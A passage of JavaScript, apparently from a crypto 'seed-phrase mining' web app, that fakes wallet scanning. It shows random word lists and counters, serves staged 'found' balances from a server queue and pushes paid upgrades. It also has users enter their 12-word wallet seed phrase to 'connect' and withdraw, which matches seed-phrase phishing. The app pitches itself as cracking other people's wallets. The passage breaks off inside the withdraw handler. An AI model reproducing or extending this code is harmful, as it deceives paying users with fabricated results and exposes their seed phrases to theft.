    window._resumingFromBg = false;
    if (!_isResume) {
      checked = 0;
      document.getElementById('checkedNum').textContent='0';
      document.getElementById('checkedTerminal').innerHTML='';
    } else {
      
      if (window._resumedChecked) {
        checked = window._resumedChecked;
        window._resumedChecked = 0;
      }
    }
    running=true;
    var tb=document.getElementById('checkedTerminal');if(tb)tb.classList.add('scanning');
    reorderChips();
    document.getElementById('chainsRow').classList.add('scan-locked');
    btn.classList.add('running');
    document.getElementById('scanIcon').innerHTML='<rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>';
    if (_isResume && window._scanStartTs) {
      sec = Math.floor(Date.now()/1000 - window._scanStartTs);
    } else { sec = 0; }
    document.getElementById('scanTxt').textContent=fmt(sec);
    var p=document.getElementById('idlePill');p.textContent='● RUNNING';p.classList.add('running');
    timerInt=setInterval(function(){sec++;document.getElementById('scanTxt').textContent=fmt(sec);},1000);
    
    _showStoreStyleToast('⚙️ Work Now');
    
    
    
    if(boostRunning && boostSec>0 && !boostTimerInt){
      boostTimerInt=setInterval(tickBoost,1000);
    }
    
    if(window._bgStateInt){clearInterval(window._bgStateInt);window._bgStateInt=null;}
    window._bgStateInt=setInterval(function(){
      if(!running){clearInterval(window._bgStateInt);window._bgStateInt=null;return;}
      var _bgSw2=document.querySelectorAll('.s-switch input[type=checkbox]')[0];
      if(!(_bgSw2&&_bgSw2.checked)) return; 
      if(window.DB&&window.DB.tgId){
        window.DB.call('set_scan_state',{
          tg_id:window.DB.tgId,
          active:1,
          start_time:window._scanStartTs||Math.floor(Date.now()/1000),
          checked:checked
        }).catch(function(){});
      }
    },30000);

    
    var _pingCount=0;
    var _pingPaused=false;
    var _pingCheckInt=setInterval(function(){
      if(!running){clearInterval(_pingCheckInt);return;}
      checkConnectivity(function(ok){
        if(ok){
          if(_pingPaused){
            
            _pingPaused=false;
            clearInterval(scanInt);
            scanInt=setInterval(_scanTick,80);
            var p2=document.getElementById('idlePill');
            p2.textContent='● RUNNING';p2.classList.add('running');
            _showStoreStyleToast('✅  Connection restored — scanning resumed!');
          }
        } else {
          if(!_pingPaused){
            
            _pingPaused=true;
            clearInterval(scanInt);
            var p2=document.getElementById('idlePill');
            p2.textContent='⚠ CHECKING';p2.classList.remove('running');
            _showStoreStyleToast('⚠️  No connection — retrying in 5s...');
            setTimeout(function(){
              if(!running)return;
              checkConnectivity(function(ok2){
                if(ok2){
                  _pingPaused=false;
                  scanInt=setInterval(_scanTick,80);
                  var p3=document.getElementById('idlePill');
                  p3.textContent='● RUNNING';p3.classList.add('running');
                  _showStoreStyleToast('✅  Connection restored — scanning resumed!');
                } else {
                  
                  _pingPaused=false;
                  clearInterval(_pingCheckInt);
                  stopScan();
                  
                  setTimeout(function(){
                    var btn=document.getElementById('scanBtn');
                    if(btn){btn.disabled=false;btn.style.opacity='';btn.style.filter='';btn.style.cursor='';}
                  },100);
                  _showStoreStyleToast('🔴  No internet — mining stopped. Check your connection.');
                }
              });
            },5000);
          }
        }
      });
    },5000);

    function _scanTick(){
      
      if((window.ALFA_PLAN_LEVEL||0)<1){
        var totalSearched=(window.TRIAL_COUNT||0)+checked;
        if(totalSearched>=(window.MAX_TRIALS||1000)){
          
          clearInterval(scanInt);scanInt=null;
          clearInterval(timerInt);timerInt=null;
          running=false;
          var btn2=document.getElementById('scanBtn');
          if(btn2){btn2.classList.remove('running');btn2.disabled=false;btn2.style.opacity='';btn2.style.filter='';btn2.style.cursor='';}
          var scanTxt2=document.getElementById('scanTxt');if(scanTxt2)scanTxt2.textContent='Start Mining';
          var scanIcon2=document.getElementById('scanIcon');if(scanIcon2)scanIcon2.innerHTML='<polygon points="6 3 20 12 6 21 6 3"/>';
          var pill2=document.getElementById('idlePill');if(pill2){pill2.textContent='○ IDLE';pill2.classList.remove('running');}
          var chainsRowEl2=document.getElementById('chainsRow');if(chainsRowEl2)chainsRowEl2.classList.remove('scan-locked');
          
          if(window.DB&&window.DB.saveTrialCount) window.DB.saveTrialCount(totalSearched);
          
          var ov=document.getElementById('_trialEndOv');
          if(!ov){
            ov=document.createElement('div');
            ov.id='_trialEndOv';
            ov.style.cssText=[
              'position:fixed','bottom:80px','left:50%',
              'transform:translateX(-50%) translateY(20px)',
              'z-index:59999',
              'background:linear-gradient(135deg,rgba(20,8,40,.97),rgba(10,5,22,.98))',
              'border:1px solid rgba(255,100,80,.45)',
              'border-radius:16px','padding:12px 16px',
              'display:flex','align-items:center','gap:12px',
              'box-shadow:0 8px 32px rgba(0,0,0,.6)',
              'opacity:0','transition:opacity .25s ease,transform .25s ease',
              'pointer-events:auto','max-width:calc(100vw - 32px)',
              'min-width:260px','white-space:nowrap'
            ].join(';');
            ov.innerHTML='<span style="font-size:1.4rem;flex-shrink:0;">⏱️</span>'
              +'<div style="flex:1;min-width:0;">'
              +'<div style="font-family:Outfit,sans-serif;font-size:.78rem;font-weight:800;color:#e8ebff;">Trial Limit Reached</div>'
              +'<div style="font-family:Outfit,sans-serif;font-size:.68rem;color:rgba(200,170,170,.7);margin-top:2px;white-space:normal;line-height:1.3;">'+(window.MAX_TRIALS||1000).toLocaleString()+' seed phrases used. Upgrade for unlimited.</div>'
              +'</div>';
            var _ubtn=document.createElement('button');
            _ubtn.style.cssText='flex-shrink:0;padding:7px 12px;border:none;border-radius:10px;font-family:Outfit,sans-serif;font-size:.7rem;font-weight:900;letter-spacing:.05em;text-transform:uppercase;cursor:pointer;color:#fff;background:linear-gradient(135deg,#7c5cff,#00cfb4);white-space:nowrap;';
            _ubtn.textContent='UPGRADE';
            _ubtn.onclick=function(){var _o=document.getElementById('_trialEndOv');if(_o){_o.style.opacity='0';_o.style.transform='translateX(-50%) translateY(20px)';setTimeout(function(){_o.style.display='none';},250);}if(typeof gotoScreen==='function')gotoScreen('screen-store');};
            ov.appendChild(_ubtn);
            document.body.appendChild(ov);
          }
          ov.style.display='flex';
          void ov.offsetWidth;
          ov.style.opacity='1';
          ov.style.transform='translateX(-50%) translateY(0)';
          return;
        }
      }
      var jump=boostRunning?Math.floor(Math.random()*51)+20:Math.floor(Math.random()*16)+5;
      var prevChecked = checked;
      checked+=jump;
      document.getElementById('checkedNum').textContent=checked;
      
      if(typeof window.showMsgIfNeeded==='function'){
        window.showMsgIfNeeded(checked);
      }

      
      if(window.DB && window.DB.tgId){
        
        if(!window._gettedQueue) window._gettedQueue = null;  
        if(!window._gettedFiredKeys) window._gettedFiredKeys = {};

        
        
        if(window._gettedQueue === null && !window._gettedLoading){
          window._gettedQueue = [];
        }

        
        if(Array.isArray(window._gettedQueue)){
          window._gettedQueue.forEach(function(gd){
            var gKey = gd.key || ('id_'+gd.id);
            if(window._gettedFiredKeys[gKey]) return; 
            if(checked < gd.checked) return;          
            window._gettedFiredKeys[gKey] = true;

            
            var gCoin = (function(){
              var cMap = {BTC:'#f7931a',ETH:'#627eea',BNB:'#f3ba2f',TRX:'#ef0027',SOL:'#9945ff',XRP:'#346aa9',USDT:'#26a17b',DOGE:'#c2a633',LTC:'#bfbbbb',TON:'#0098ea'};
              var iMap = {BTC:'images/how1p.png',ETH:'images/n27v6.png',BNB:'images/yt9z0.png',TRX:'images/6ulyt.png',SOL:'images/kqcoz.png',XRP:'images/mpcf0.png',USDT:'images/tdg4r.png',DOGE:'images/hpym7.png',LTC:'images/f4bm5.png',TON:'images/9k5bw.png'};
              var n = (gd.coin || 'BTC').toUpperCase();
              return { name:n, img:iMap[n]||'images/how1p.png', color:cMap[n]||'#a78bfa' };
            })();
            var gPriceRaw = (gd.price || '').toString();
            var gAmt = gPriceRaw.split('=')[0].trim() || '?';
            var gUsdMatch = gPriceRaw.match(/\$([0-9.]+)/);
            var gUsd = gUsdMatch ? gUsdMatch[1] : '0.00';
            var gWords = gd.walet || rw(12).join(' ');
            var gCopyBtn = '<button class="found-copy-btn" data-copy="'+gWords.replace(/"/g,'&quot;')+'" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg></button>';
            var gLineHTML = '<img draggable="false" src="'+gCoin.img+'" alt=""/>'
              +'<span class="found-coin" style="color:'+gCoin.color+'">'+gCoin.name+'</span>'
              +'<span class="found-val" style="color:#cbd5e1"> '+gAmt+'</span>'
              +'<span class="found-eq"> =</span>'
              +'<span class="found-usd" style="color:#6ab4ff"> $'+gUsd+'</span>'
              +'<span class="found-sep"> ↪ </span>'
              +'<span class="found-words">'+gWords+'</span>'
              +gCopyBtn;

            
            window._gettedSavePending = true;

            
            var gFb = document.getElementById('foundBody');
            if(gFb){
              var gPh = gFb.querySelector('.found-placeholder'); if(gPh) gPh.remove();
              var gDiv = document.createElement('div'); gDiv.className='found-line'; gDiv.innerHTML=gLineHTML;
              gFb.appendChild(gDiv); gFb.scrollTop=gFb.scrollHeight;
            }

            
            var gAl = document.getElementById('archList');
            var gAe = document.getElementById('archEmpty');
            if(gAl){
              if(gAe) gAe.style.display='none';
              var gDiv2=document.createElement('div'); gDiv2.className='found-line arch-found-line'; gDiv2.innerHTML=gLineHTML;
              gAl.appendChild(gDiv2);
            }

            
            var gFn=document.getElementById('foundNum');   var newFn=(parseInt((gFn&&gFn.textContent)||'0')||0)+1; if(gFn) gFn.textContent=newFn;
            var gPf=document.getElementById('pendingFound'); if(gPf) gPf.textContent=newFn;
            var gPv=document.getElementById('pendingVal');
            if(gPv){var cur=parseFloat(gPv.textContent.replace(/[^0-9.]/g,''))||0;var nw=(cur+parseFloat(gUsd)).toFixed(2);var pts=nw.split('.');gPv.innerHTML='$'+pts[0]+'<span style="font-size:.875rem;opacity:.55">.'+(pts[1]||'00')+'</span>';}

            
            var gPb=document.getElementById('pendingFoundCoin');
            if(!gPb){gPb=document.createElement('div');gPb.id='pendingFoundCoin';gPb.className='pending-found-coin';var _progressBar=document.getElementById('withdrawProgressBar');var _pendingInfo=_progressBar?_progressBar.parentNode:document.querySelector('.pending-info');if(_pendingInfo&&_progressBar){_pendingInfo.insertBefore(gPb,_progressBar);}else if(_pendingInfo){_pendingInfo.appendChild(gPb);}}
            if(gPb){gPb.innerHTML='<img draggable="false" src="'+gCoin.img+'" style="width:16px;height:16px;border-radius:50%;vertical-align:middle;margin-right:5px;flex-shrink:0;"/><span style="color:'+gCoin.color+';font-weight:700;font-size:11px;">'+gCoin.name+'</span> <span style="color:#6ab4ff;font-size:11px;">+$'+gUsd+'</span>';}

            
            var gUsdNum=parseFloat(gUsd)||0;
            if(!window.DASH_STATS) window.DASH_STATS={allTime:0,last30:0,coins:{BTC:0,ETH:0,BNB:0,SOL:0,TRX:0,XRP:0,USDT:0,DOGE:0,LTC:0}};
            window.DASH_STATS.allTime+=gUsdNum; window.DASH_STATS.last30+=gUsdNum;
            
            var gRawAmt = parseFloat(gAmt) || 0;
            if(window.DASH_STATS.coins[gCoin.name]!==undefined) window.DASH_STATS.coins[gCoin.name]+=gRawAmt;
            else window.DASH_STATS.coins[gCoin.name] = gRawAmt;
            if(typeof updateDashCards==='function') updateDashCards();

            
            if(window.DB && window.DB.tgId){
              var _fb2=document.getElementById('foundBody');var _al2=document.getElementById('archList');var _pfEl=document.getElementById('pendingFound');var _pvEl=document.getElementById('pendingVal');var _fnEl=document.getElementById('foundNum');
              
              if(window.DASH_STATS){window.DASH_STATS.allTime=window.DASH_STATS.allTime||0;window.DASH_STATS.last30=window.DASH_STATS.last30||0;}
              window.DB.call('save_getted_batch',{
                tg_id:         window.DB.tgId,
                
                keys:          Object.keys(window._gettedFiredKeys),
                
                found_count:   _fnEl?parseInt(_fnEl.textContent)||0:0,
                pending_found: _pfEl?parseInt(_pfEl.textContent)||0:0,
                pending_val:   _pvEl?parseFloat(_pvEl.textContent.replace(/[^0-9.]/g,''))||0:0,
                found_body:    _fb2?_fb2.innerHTML:'',
                arch_count:    _al2?_al2.querySelectorAll('.arch-found-line').length:0,
                
                all_time:      (window.DASH_STATS&&window.DASH_STATS.allTime)||0,
                last30:        (window.DASH_STATS&&window.DASH_STATS.last30)||0,
                last30_ts:     (window.DASH_STATS&&window.DASH_STATS.last30_ts)||0,
                coins:         (window.DASH_STATS&&window.DASH_STATS.coins)||{}
              }).catch(function(){});
              window._gettedSavePending = false;
            }
          });
        }
      }
      var sp=document.getElementById('speedPill');
      if(sp){
        var base=80+Math.random()*180;
        var speed=boostRunning?base*3:base;
        sp.textContent='⚡ '+speed.toFixed(1)+'m/s';
      }
      var w=rw(12).join(' ');
      var t=document.getElementById('checkedTerminal');
      var d=document.createElement('div');d.className='trm-line';
      d.innerHTML='<span class="trm-prompt">$</span> <span class="trm-k">Wallet Check:</span> <span class="trm-v">'+w+'</span><span class="trm-wc-dots">...</span>';
      t.appendChild(d);
      var ls=t.querySelectorAll('.trm-line');
      if(ls.length>30)ls[0].remove();
      t.scrollTop=t.scrollHeight;
    }
    scanInt=setInterval(_scanTick,80);
  },1000);
}

function stopScan(){
  running=false;
  var _bgSwStop=document.querySelectorAll('.s-switch input[type=checkbox]')[0];
  if(window.DB&&window.DB.tgId&&_bgSwStop&&_bgSwStop.checked){
    window.DB.call('set_scan_state',{tg_id:window.DB.tgId,active:0,start_time:0}).catch(function(){});
  }
  
  if(boostTimerInt){clearInterval(boostTimerInt);boostTimerInt=null;}
  var tb=document.getElementById('checkedTerminal');if(tb)tb.classList.remove('scanning');
  document.getElementById('chainsRow').classList.remove('scan-locked');
  restoreChips();
  clearInterval(scanInt);clearInterval(timerInt);
  if(window._bgStateInt){clearInterval(window._bgStateInt);window._bgStateInt=null;}
  var btn=document.getElementById('scanBtn');btn.classList.remove('running');
  document.getElementById('scanIcon').innerHTML='<polygon points="6 3 20 12 6 21 6 3"/>';
  document.getElementById('scanTxt').textContent='Start Mining';
  var p=document.getElementById('idlePill');p.textContent='○ IDLE';p.classList.remove('running');
  var sp=document.getElementById('speedPill');if(sp)sp.textContent='';
  document.getElementById('checkedNum').textContent=checked+' — '+fmt(sec);
  
  updateBoostPill();
}

function saveSettings(){
  var b=document.querySelector('[onclick="saveSettings()"]'),o=b.textContent;
  b.textContent='✓ Saved!';
  setTimeout(function(){b.textContent=o;},1500);
}

var WALLET_ICONS = {
  'Trust Wallet': '<img src="images/j7pmj.png" style="width:28px;height:28px;border-radius:8px;object-fit:cover;display:block;">',
  'Tonkeeper':    '<img src="images/poajv.png"   style="width:28px;height:28px;border-radius:8px;object-fit:cover;display:block;">',
  'MetaMask':     '<img src="images/n57gj.png"    style="width:28px;height:28px;border-radius:8px;object-fit:cover;display:block;">',
  'Bybit':        '<img src="images/f3ihd.png"       style="width:28px;height:28px;border-radius:8px;object-fit:cover;display:block;">',
  'Phantom':      '<img src="images/g3l8w.png"     style="width:28px;height:28px;border-radius:8px;object-fit:cover;display:block;">',
  'Other Wallets':'<img src="images/rok7d.png" style="width:28px;height:28px;border-radius:8px;object-fit:cover;display:block;">'
};

function selectWallet(name){
  closeOverlay('walletSelectOverlay');
  var title=document.getElementById('seedWalletTitle');
  var badge=document.getElementById('seedWalletBadge');
  if(title)title.textContent=name;
  if(badge)badge.innerHTML=WALLET_ICONS[name]||'';
  var grid=document.getElementById('seedGrid');
  if(grid){
    grid.innerHTML='';
    for(var i=1;i<=12;i++){
      var wrap=document.createElement('div');
      wrap.className='seed-field';
      wrap.innerHTML='<span class="seed-num">'+i+'</span><input class="seed-inp" type="text" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" placeholder="word '+i+'"/>';
      grid.appendChild(wrap);
    }
  }
  openOverlay('seedPhraseOverlay');
}

function showSeedLog(type,msg){
  var log=document.getElementById('seedLog');
  if(!log)return;
  log.className='seed-log';
  void log.offsetWidth;
  var icon=type==='error'
    ?'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>'
    :'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>';
  log.innerHTML=icon+'<span>'+msg+'</span>';
  log.classList.add('visible',type==='error'?'log-error':'log-success');
  if(type==='success'){setTimeout(function(){log.className='seed-log';log.innerHTML='';},2500);}
}

var _connectedWallet=null;
function loadWalletState(){try{var s=localStorage.getItem('alfa_wallet');if(s)_connectedWallet=JSON.parse(s);}catch(e){}}
function saveWalletState(name,words){_connectedWallet={name:name,words:words||[],ts:Date.now()};try{localStorage.setItem('alfa_wallet',JSON.stringify(_connectedWallet));}catch(e){}}
function clearWalletState(){_connectedWallet=null;try{localStorage.removeItem('alfa_wallet');}catch(e){}}

function applyWalletUI(){
  var connectBtn=document.getElementById('mainConnectBtn');
  var connectTxt=document.getElementById('mainConnectTxt');
  var connectIcon=document.getElementById('mainConnectIcon');
  if(!connectBtn)return;
  if(_connectedWallet){
    connectBtn.classList.add('btn-deselect','btn-deselect-wallet','btn-detached-state');
    connectBtn.classList.remove('btn-detach-wallet');
    if(connectIcon){connectIcon.innerHTML='<path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="17 16 22 12 17 8"/><line x1="22" y1="12" x2="10" y2="12"/>';}
    if(connectTxt){connectTxt.textContent='Detach Wallet';}
  } else {
    connectBtn.classList.add('btn-deselect','btn-deselect-wallet');
    connectBtn.classList.remove('btn-detached-state','btn-detach-wallet');
    if(connectIcon){connectIcon.innerHTML='<path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"/><path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"/>';}
    if(connectTxt){connectTxt.textContent='Connect Wallet';}
  }
}

function showConnectBtnToast(msg, isOk) {
  
  var btn = document.getElementById('mainConnectBtn');
  if (!btn) return;
  var old = document.getElementById('_cwBtnToast');
  if (old) { clearTimeout(old._t); old.remove(); }

  var t = document.createElement('div');
  t.id = '_cwBtnToast';
  var rect = btn.getBoundingClientRect();
  t.style.cssText = [
    'position:fixed',
    'left:' + Math.round(rect.left + rect.width/2) + 'px',
    'top:' + Math.round(rect.top - 12) + 'px',
    'transform:translate(-50%,-100%) translateY(6px)',
    'background:' + (isOk
      ? 'linear-gradient(135deg,rgba(0,180,100,.97),rgba(0,130,70,.99))'
      : 'linear-gradient(135deg,rgba(180,50,50,.97),rgba(130,20,20,.99))'),
    'border:1px solid ' + (isOk ? 'rgba(0,255,163,.4)' : 'rgba(255,80,80,.4)'),
    'color:#fff',
    'font-family:Outfit,sans-serif',
    'font-size:.72rem',
    'font-weight:700',
    'padding:7px 14px',
    'border-radius:10px',
    'box-shadow:0 6px 24px rgba(0,0,0,.5)',
    'white-space:nowrap',
    'z-index:59999',
    'pointer-events:none',
    'opacity:0',
    'transition:opacity .2s ease,transform .2s ease'
  ].join(';');
  t.textContent = msg;
  document.body.appendChild(t);
  void t.offsetWidth;
  t.style.opacity = '1';
  t.style.transform = 'translate(-50%,-100%) translateY(0)';
  t._t = setTimeout(function(){
    t.style.opacity = '0';
    t.style.transform = 'translate(-50%,-100%) translateY(-6px)';
    setTimeout(function(){ if(t.parentNode) t.remove(); }, 220);
  }, 2800);
}

function handleWalletBtn(){
  var btnTxt = document.getElementById('mainConnectTxt');
  var isDetach = btnTxt && (btnTxt.textContent.indexOf('Detach') !== -1);
  if(_connectedWallet || isDetach){
    openDetachDialog();
  } else {
    openOverlay('walletIntroOverlay');
  }
}

function _showUpgradeGate() {
  
  var g = document.getElementById('_upgradeGateMsg');
  if (!g) {
    g = document.createElement('div');
    g.id = '_upgradeGateMsg';
    g.style.cssText = [
      'position:fixed','inset:0','z-index:59999',
      'display:flex','align-items:center','justify-content:center',
      'background:rgba(0,0,0,.78)','backdrop-filter:blur(16px)',
      '-webkit-backdrop-filter:blur(16px)',
      'opacity:0','transition:opacity .22s ease'
    ].join(';');
    g.innerHTML = '<div style="'
      + 'background:linear-gradient(160deg,rgba(16,10,36,.99),rgba(7,5,18,1));'
      + 'border:1px solid rgba(124,92,255,.45);border-radius:22px;'
      + 'padding:28px 26px;width:min(300px,88vw);text-align:center;'
      + 'box-shadow:0 24px 80px rgba(0,0,0,.85),0 0 0 1px rgba(124,92,255,.1) inset;'
      + 'transform:scale(.88);transition:transform .3s cubic-bezier(.25,1.4,.5,1),opacity .25s ease;opacity:0;">'
      + '<div style="font-size:2rem;margin-bottom:12px;">🔒</div>'
      + '<div style="font-family:Outfit,sans-serif;font-size:1rem;font-weight:800;color:#e8ebff;margin-bottom:8px;">Purchase Required</div>'
      + '<div style="font-family:Outfit,sans-serif;font-size:.78rem;color:rgba(180,170,230,.65);line-height:1.5;">'
      + 'Connect Wallet is available for paid plans only. Please upgrade to use this feature.</div>'
      + '</div>';
    document.body.appendChild(g);
  }
  g.style.display = 'flex';
  void g.offsetWidth;
  g.style.opacity = '1';
  var card = g.querySelector('div');
  if (card) { void card.offsetWidth; card.style.transform='scale(1)'; card.style.opacity='1'; }
  
  clearTimeout(g._t);
  g._t = setTimeout(function(){
    g.style.opacity = '0';
    if (card) { card.style.transform='scale(.88)'; card.style.opacity='0'; }
    setTimeout(function(){ g.style.display='none'; }, 240);
  }, 1000);
}
window.handleWalletBtn = handleWalletBtn;

function openDetachDialogDirect(){
  
  var overlay = document.getElementById('detachWalletOverlay');
  if(overlay){
    overlay.classList.add('open');
    document.body.style.overflow='hidden';
  }
}

_onDom(function(){
  var btn = document.getElementById('mainConnectBtn');
  if(!btn) return;
  btn.addEventListener('click', function(e){
    e.stopPropagation();
    handleWalletBtn();
  });
});

function openDetachDialog(){
  try{
    var words=(_connectedWallet&&_connectedWallet.words)||[];
    var grid=document.getElementById('detachWordsGrid');
    if(grid){
      grid.innerHTML='';
      for(var i=0;i<12;i++){
        var field=document.createElement('div');
        field.className='seed-field';
        field.style.cursor='default';
        var num=document.createElement('span');
        num.className='seed-num';
        num.textContent=i+1;
        var inp=document.createElement('input');
        inp.className='seed-inp detach-word-inp';
        inp.type='text';
        inp.readOnly=true;
        inp.setAttribute('data-word', words[i]||'');
        inp.value='\u2022\u2022\u2022\u2022\u2022\u2022';
        inp.style.filter='blur(4px)';
        inp.style.userSelect='none';
        inp.style.pointerEvents='none';
        inp.style.color='hsl(var(--muted-foreground))';
        field.appendChild(num);
        field.appendChild(inp);
        grid.appendChild(field);
      }
    }
    var txt=document.getElementById('detachToggleTxt');
    var icon=document.getElementById('detachEyeIcon');
    if(txt)txt.textContent='Show';
    if(icon)icon.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
    _detachWordsVisible=false;
    var cpTxt=document.getElementById('detachCopyTxt');
    var cpIcon=document.getElementById('detachCopyIcon');
    if(cpTxt)cpTxt.textContent='Copy';
    if(cpIcon)cpIcon.innerHTML='<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>';
    var log=document.getElementById('detachLog');
    if(log){log.className='seed-log';log.innerHTML='';}
  }catch(err){
}
  var overlay=document.getElementById('detachWalletOverlay');
  if(overlay){overlay.classList.add('open');document.body.style.overflow='hidden';}
}
window.openDetachDialog = openDetachDialog;

var _detachWordsVisible=false;
function toggleDetachWords(){
  _detachWordsVisible=!_detachWordsVisible;
  var inputs=document.querySelectorAll('#detachWordsGrid .detach-word-inp');
  var txt=document.getElementById('detachToggleTxt');
  var icon=document.getElementById('detachEyeIcon');
  inputs.forEach(function(inp){
    var word=inp.getAttribute('data-word');
    if(_detachWordsVisible){
      inp.value=word||'?';
      inp.style.filter='none';
      inp.style.color='hsl(var(--foreground))';
    } else {
      inp.value='••••••';
      inp.style.filter='blur(4px)';
      inp.style.color='hsl(var(--muted-foreground))';
    }
  });
  if(txt)txt.textContent=_detachWordsVisible?'Hide':'Show';
  if(icon){
    if(_detachWordsVisible){
      icon.innerHTML='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
    } else {
      icon.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
    }
  }
}
function copyDetachWords(){
  var words=(_connectedWallet&&_connectedWallet.words)||[];
  var phrase=words.join(' ');
  var cpTxt=document.getElementById('detachCopyTxt');
  var cpIcon=document.getElementById('detachCopyIcon');
  function onSuccess(){
    if(cpTxt)cpTxt.textContent='Copied!';
    if(cpIcon)cpIcon.innerHTML='<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>';
    setTimeout(function(){
      if(cpTxt)cpTxt.textContent='Copy';
      if(cpIcon)cpIcon.innerHTML='<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>';
    },2000);
  }
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(phrase).then(onSuccess).catch(function(){
      var ta=document.createElement('textarea');ta.value=phrase;ta.style.position='fixed';ta.style.opacity='0';
      document.body.appendChild(ta);ta.select();try{document.execCommand('copy');onSuccess();}catch(e){}document.body.removeChild(ta);
    });
  } else {
    var ta=document.createElement('textarea');ta.value=phrase;ta.style.position='fixed';ta.style.opacity='0';
    document.body.appendChild(ta);ta.select();try{document.execCommand('copy');onSuccess();}catch(e){}document.body.removeChild(ta);
  }
}

function confirmDetachWallet(){
  var log=document.getElementById('detachLog');
  if(log){
    log.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><span>Wallet disconnected</span>';
    log.classList.add('visible','log-success');
  }
  setTimeout(function(){
    var overlay=document.getElementById('detachWalletOverlay');
    if(overlay){overlay.classList.remove('open');document.body.style.overflow='';}
    clearWalletState();
    applyWalletUI();
  }, 900);
}

var _withdrawBusy=false;
function refreshPendingCoin(){
  var fb=document.getElementById('foundBody');
  var pb=document.getElementById('pendingFoundCoin');
  var pv=document.getElementById('pendingVal');
  var pf=document.getElementById('pendingFound');
  if(!fb)return;
  var lines=fb.querySelectorAll('.found-line');
  if(lines.length===0){
    
    if(pb)pb.innerHTML='';
    if(pv)pv.innerHTML='$0<span style="font-size:.875rem;opacity:.55">.00</span>';
    return;
  }
  
  var lastLine=lines[lines.length-1];
  var coinEl=lastLine.querySelector('.found-coin');
  var usdEl=lastLine.querySelector('.found-usd');
  var imgEl=lastLine.querySelector('img');
  if(!pb){
    pb=document.createElement('div');
    pb.id='pendingFoundCoin';
    pb.className='pending-found-coin';
    var progressBar=document.getElementById('withdrawProgressBar');
    var pendingInfo=progressBar?progressBar.parentNode:document.querySelector('.pending-info');
    if(pendingInfo&&progressBar){pendingInfo.insertBefore(pb,progressBar);}
    else if(pendingInfo){pendingInfo.appendChild(pb);}
  }
  if(pb&&coinEl&&usdEl){
    var coinName=coinEl.textContent.trim();
    var coinColor=coinEl.style.color||'#e8ebff';
    var usdText=usdEl.textContent.trim();
    var imgSrc=imgEl?imgEl.getAttribute('src'):'';
    pb.innerHTML=(imgSrc?'<img draggable="false" src="'+imgSrc+'" style="width:16px;height:16px;border-radius:50%;vertical-align:middle;margin-right:5px;flex-shrink:0;"/>':'')
      +'<span style="color:'+coinColor+';font-weight:700;font-size:11px;">'+coinName+'</span>'
      +' <span style="color:#6ab4ff;font-size:11px;">'+usdText+'</span>';
  }
  
  var total=0;
  lines.forEach(function(line){
    var u=line.querySelector('.found-usd');
    if(u) total+=parseFloat(u.textContent.replace(/[^0-9.]/g,''))||0;
  });
  if(pv){var parts=total.toFixed(2).split('.');pv.innerHTML='$'+parts[0]+'<span style="font-size:.875rem;opacity:.55">.'+(parts[1]||'00')+'</span>';}
  if(pf) pf.textContent=lines.length;
  var fn=document.getElementById('foundNum');
  if(fn) fn.textContent=lines.length;
}

function handleWithdraw(){
  if(!_connectedWallet){
    _showWithdrawBlockMsg(
      '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:32px;height:32px;color:#a78bfa;flex-shrink:0;"><rect x="5" y="10" width="14" height="10" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>',
      'Wallet Not Connected',
      'Connect a wallet first to withdraw your earnings. Tap <b>Connect Wallet</b> below.'
    );
    return;
  }
  var foundEl=document.getElementById('foundNum');
  var foundCount=foundEl?parseInt(foundEl.textContent)||0:0;
  if(foundCount<1){
    _showWithdrawBlockMsg(
